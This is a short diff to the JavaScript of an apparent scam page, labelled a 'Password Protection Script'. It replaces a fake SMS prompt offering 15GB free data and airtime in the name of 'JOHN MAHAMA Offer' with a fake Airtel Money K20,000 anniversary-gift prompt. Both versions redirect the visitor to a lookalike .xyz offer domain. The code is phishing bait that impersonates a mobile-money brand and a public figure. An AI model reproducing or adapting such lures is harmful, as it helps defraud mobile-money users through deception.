@@ -1,6 +1,7 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
-var password = '15GB Free Data'
-password=prompt('SMS: Congratulations You are Eligible to receive GH₵20 Airtime and 15GB Free Data From JOHN MAHAMA Offer, Kindly Press OK to ACTIVATE ','15GB Free Data');
-if (password != '15GB Free Data') {
-location.href='https://mahama.data-offer.xyz/15GB';
+var password = 'K20,000'
+password=prompt('SMS: Congratulations, your Airtel Money account has qualified to receive the K20,000 Airtel Money Anniversary gift, Please Click OK TO CONTINUE  ','K20,000');
+if (password != 'K20,000') {
+location.href='https://airtel-money.offer-it.xyz/gift';
+
 }
